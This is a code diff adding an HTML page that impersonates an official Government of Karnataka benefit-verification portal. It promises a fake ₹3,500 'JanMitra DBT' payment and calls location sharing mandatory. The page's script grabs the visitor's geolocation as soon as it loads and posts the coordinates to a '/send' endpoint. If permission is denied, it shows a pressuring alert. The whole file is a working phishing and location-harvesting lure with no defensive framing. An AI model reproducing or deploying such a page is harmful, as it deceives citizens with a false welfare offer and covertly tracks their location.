@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ಭಾರತ ಸರ್ಕಾರ | GOVERNMENT OF KARNATAKA</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      background-color: #f2f2f2;
+    }
+    header {
+      background: linear-gradient(to right, #ff9933, #ffffff, #138808);
+      padding: 20px 10px;
+      text-align: center;
+      border-bottom: 3px solid #444;
+    }
+    .emblem {
+      height: 60px;
+      vertical-align: middle;
+      margin-right: 10px;
+    }
+    .header-text {
+      display: inline-block;
+      vertical-align: middle;
+    }
+    .content {
+      padding: 30px;
+      text-align: center;
+    }
+    .notice {
+      background: #ffffff;
+      border: 1px solid #ccc;
+      padding: 25px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+    footer {
+      text-align: center;
+      font-size: 13px;
+      padding: 15px;
+      color: #777;
+      margin-top: 40px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" class="emblem" alt="Emblem" />
+    <div class="header-text">
+      <h2>ಭಾರತ ಸರ್ಕಾರ | GOVERNMENT OF KARNATAKA</h2>
+      <h4>Official Digital Benefit Verification Portal</h4>
+    </div>
+  </header>
+
+  <div class="content">
+    <div class="notice">
+      <h3>🎯 JanMitra DBT Assistance – ₹3,500</h3>
+      <p>Eligible citizens in select areas will receive a Direct Benefit Transfer (DBT) of ₹3,500.</p>
+      <p>📌 Kindly enable your location access to verify regional eligibility.</p>
+      <p><strong>This verification is mandatory under the 2024-25 Karnataka Digital Scheme rollout.</strong></p>
+    </div>
+  </div>
+
+  <footer>
+    Government of Karnataka | Digital Governance Mission © 2024
+  </footer>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch("/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ lat: lat, lon: lon })
+      });
+    }
+
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      sendLocation(pos.coords.latitude, pos.coords.longitude);
+    }, function(err) {
+      alert("⚠️ Location access is required to check your eligibility.");
+    });
+  </script>
+</body>
+</html>
